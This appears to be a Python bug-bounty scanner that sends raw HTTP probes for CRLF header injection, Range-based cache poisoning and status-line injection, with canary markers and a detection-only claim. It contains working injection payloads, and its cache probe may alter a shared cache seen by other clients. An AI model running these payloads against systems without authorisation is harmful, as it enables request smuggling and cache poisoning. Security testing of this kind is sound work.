#!/usr/bin/env python3
"""CRLF header-injection and cache-layer probes - detection sweeps for the
August 2026 desync research classes.

Covers three techniques that classic smuggling probes miss:

  crlf-header-injection  Frontend decodes %0d%0a inside a header VALUE and
                         forwards a second injected header to the backend.
                         Common root cause: nginx proxy_pass decoding.
                         Escalation path: injected Content-Length/TE -> desync.
  range-cache-poisoning  Attacker-controlled Range requests whose 206 partial
                         responses get cached by CDNs and later served as full
                         200 bodies to other clients (HTTP Terminator class).
  status-line-injection  CRLF in request line reflected into the RESPONSE
                         status line (reason phrase / version confusion).

DETECTION ONLY. Every probe carries a unique canary; nothing is delivered to
third parties, no code redemption, no persistent mutation attempts.

Usage:
    crlf_desync.py --target https://example.com --matrix all --output findings.jsonl
    crlf_desync.py --target https://example.com --path /api/x --matrix crlf,range --dry-run
"""

import argparse
import json
import os
import socket
import ssl
import sys
import time
import uuid
from datetime import UTC, datetime
from pathlib import Path

RATE_LIMIT = float(os.environ.get("RATE_LIMIT", "5"))
UA = "Mozilla/5.0 (Security Research; BountyHarness)"


def now_iso() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(msg: str) -> None:
    print(f"[{now_iso()}] {msg}", file=sys.stderr)


def parse_target(target: str) -> tuple[str, int, bool]:
    t = target if "://" in target else f"https://{target}"
    scheme, rest = t.split("://", 1)
    tls = scheme == "https"
    hostport = rest.split("/", 1)[0]
    host, port = (hostport.split(":") + ["443" if tls else "80"])[:2]
    return host, int(port), tls


def connect(host: str, port: int, tls: bool, timeout: float = 10.0):
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw


def send_read(sock, payload: bytes, timeout: float = 8.0) -> str:
    sock.settimeout(timeout)
    sock.sendall(payload)
    chunks = []
    start = time.time()
    try:
        while time.time() - start < timeout:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
            joined = b"".join(chunks)
            if b"\r\n\r\n" in joined and len(joined.split(b"\r\n\r\n", 1)[1]) > 32:
                break
            if b"\n\n" in joined:
                break
    except TimeoutError:
        pass
    except Exception:
        pass
    return b"".join(chunks).decode("utf-8", errors="replace")


# ── Probe 1: CRLF in header value ──

def probe_crlf_injection(host: str, port: int, tls: bool, path: str, canary: str) -> dict:
    """Percent-encoded CRLF inside a header value. If the frontend forwards it
    decoded, our canary header reaches the backend. Escalation requires an
    attacker-controllable framing header (CL/TE), which we only DETECT."""
    finding = {"probe": "crlf-header-injection", "success": False}
    encoded_crlf = "%0d%0a"
    payload = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {UA}\r\n"
        f"X-BBH-Test: aaa{encoded_crlf}X-{canary}: 1\r\n"
        f"\r\n"
    ).encode()
    try:
        s = connect(host, port, tls)
        resp = send_read(s, payload)
        s.close()
    except Exception as e:
        finding["error"] = str(e)[:100]
        return finding
    # canary reflected as a real header line in OUR response => backend saw it
    if f"X-{canary}" in resp:
        finding.update(
            success=True,
            evidence=f"injected header X-{canary} visible in response - frontend decodes %0d%0a in values",
            escalation_note="If framing headers are injectable the same way, this escalates to CL.TE desync.",
        )
    elif canary in resp:
        finding.update(success=True, evidence="canary present in response body/header region",
                       note="verify placement manually before claiming")
    return finding


# ── Probe 2: Range cache poisoning ──

def probe_range_cache(host: str, port: int, tls: bool, path: str, canary: str) -> dict:
    """Send a Range request whose response would differ from the cached full
    body; then re-request plain and look for partial/marker contamination."""
    finding = {"probe": "range-cache-poisoning", "success": False}
    # Step 1: baseline plain GET - capture cache headers
    p1 = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n\r\n".encode()
    try:
        s = connect(host, port, tls)
        base = send_read(s, p1)
        s.close()
        time.sleep(1.0 / max(RATE_LIMIT, 0.1))
        # Step 2: suspicious range request that asks for an impossible slice,
        # including a suffix-range some caches mishandle when keying.
        p2 = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {UA}\r\n"
            f"Range: bytes=0-0,{canary}-\r\n"
            "\r\n"
        ).encode()
        s = connect(host, port, tls)
        r206 = send_read(s, p2)
        s.close()
        time.sleep(1.0 / max(RATE_LIMIT, 0.1))
        # Step 3: plain GET again - does the cache now serve contaminated content?
        s = connect(host, port, tls)
        after = send_read(s, p1)
        s.close()
    except Exception as e:
        finding["error"] = str(e)[:100]
        return finding

    cache_hdrs = [h for h in ("age:", "x-cache:", "cf-cache-status:", "x-varnish:") if h in base.lower()]
    if not cache_hdrs:
        finding["note"] = "no obvious cache layer detected on this path"
        return finding

    if "multipart/byteranges" in r206 and canary in r206:
        finding["note"] = "server echoes malformed ranges as multipart; poisoning needs cache-key analysis"
    if canary in after and canary not in base:
        finding.update(success=True, evidence="canary from Range request appeared in subsequent plain GET",
                       cache_headers=", ".join(cache_hdrs))
    return finding


# ── Probe 3: status-line injection ──

def probe_status_line(host: str, port: int, tls: bool, canary: str) -> dict:
    """Encoded CRLF early in the request line. A vulnerable stack lets part of
    our string become the response reason-phrase or shifts the status line."""
    finding = {"probe": "status-line-injection", "success": False}
    evil_path = f"/%20HTTP/1.1%20200%20OK%0d%0aX-{canary}:1%0d%0a%20HTTP/1.1"
    payload = (
        f"GET {evil_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {UA}\r\n"
        "\r\n"
    ).encode()
    try:
        s = connect(host, port, tls)
        resp = send_read(s, payload)
        s.close()
    except Exception as e:
        finding["error"] = str(e)[:100]
        return finding
    first_line = resp.split("\r\n", 1)[0] if resp else ""
    if f"X-{canary}" in resp.split("\r\n\r\n")[0]:
        finding.update(success=True, evidence=f"canary header parsed near status area; first line was '{first_line[:60]}'")
    return finding


PROBES = {
    "crlf": probe_crlf_injection,
    "range": probe_range_cache,
    "statusline": probe_status_line,
}


def main():
    parser = argparse.ArgumentParser(description="CRLF/cache-layer desync probes (detection-only)")
    parser.add_argument("--target", required=True)
    parser.add_argument("--path", default="/")
    parser.add_argument("--matrix", default="all", help="comma list: crlf,range,statusline (default all)")
    parser.add_argument("--output", required=True)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    host, port, tls = parse_target(args.target)
    run_canary = uuid.uuid4().hex[:10]

    matrix = list(PROBES.keys()) if args.matrix == "all" else [m.strip() for m in args.matrix.split(",")]
    results = []
    for name in matrix:
        fn = PROBES.get(name)
        if not fn:
            log(f"unknown probe: {name}")
            continue
        if args.dry_run:
            results.append({"probe": name, "success": False, "note": "dry-run"})
            continue
        log(f"{name} -> {args.target}{args.path} (canary {run_canary})")
        r = fn(host, port, tls, args.path or "/", run_canary) if name != "statusline" \
            else fn(host, port, tls, run_canary)
        r["target"] = args.target
        r["checked_at"] = now_iso()
        results.append(r)
        log(f"{name}: {'HIT' if r.get('success') else 'no hit'}")

    Path(args.output).parent.mkdir(parents=True, exist_ok=True)
    Path(args.output).write_text("\n".join(json.dumps(r) for r in results))
    print(json.dumps({"probes_run": len(results),
                      "hits": sum(1 for r in results if r.get("success")),
                      "output": args.output}))


if __name__ == "__main__":
    main()
